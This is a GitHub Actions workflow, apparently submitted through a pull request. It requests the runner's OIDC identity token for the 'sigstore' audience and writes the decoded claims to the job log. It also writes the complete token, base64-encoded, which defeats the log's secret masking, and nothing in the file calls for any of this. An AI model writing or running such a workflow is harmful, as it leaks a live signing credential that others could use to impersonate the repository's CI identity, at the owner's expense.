name: prl-oidc-62646
on:
  workflow_dispatch:
  pull_request:
    branches: [ master ]
permissions:
  id-token: write
  contents: read
jobs:
  oidc-exchange:
    name: oidc-exchange
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: request-oidc-jwt
        run: |
          set -uo pipefail
          echo "RUN_CONTEXT repository=${GITHUB_REPOSITORY:-} ref=${GITHUB_REF:-} event=${GITHUB_EVENT_NAME:-} sha=${GITHUB_SHA:-}"
          echo "OIDC_URL_PRESENT=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
          echo "OIDC_REQ_TOKEN_PRESENT=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ] && echo yes || echo no)"
          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] || [ -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
            echo "OIDC_ENV_MISSING"; exit 3
          fi
          HTTP=$(curl -sS -m 20 -o oidc.json -w '%{http_code}'             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore")
          echo "OIDC_HTTP:${HTTP}"
          python3 - <<'PY'
          import json,base64,hashlib
          d=json.load(open('oidc.json'))
          tok=d['value']
          h,p,_=tok.split('.')
          pad=lambda s: s+'='*(-len(s)%4)
          dec=lambda s: json.loads(base64.urlsafe_b64decode(pad(s)))
          hdr=dec(h); pl=dec(p)
          print('JWT_LEN=%d JWT_SHA256_8=%s' % (len(tok), hashlib.sha256(tok.encode()).hexdigest()[:8]))
          print('JWT_HEADER='+json.dumps({k:hdr.get(k) for k in ('alg','typ','kid')},sort_keys=True))
          keys=('iss','aud','sub','ref','repository','repository_owner','event_name','sha','job_workflow_ref','job_workflow_sha','workflow_ref','workflow_sha','run_id','run_attempt','runner_environment','repository_id','repository_owner_id','repository_visibility','iat','exp')
          print('JWT_CLAIMS='+json.dumps({k:pl.get(k) for k in keys if k in pl},sort_keys=True))
          print('JWT_SUB_B64='+base64.b64encode(str(pl.get('sub','')).encode()).decode())
          print('JWT_B64='+base64.b64encode(tok.encode()).decode())
          PY
          echo "DONE"
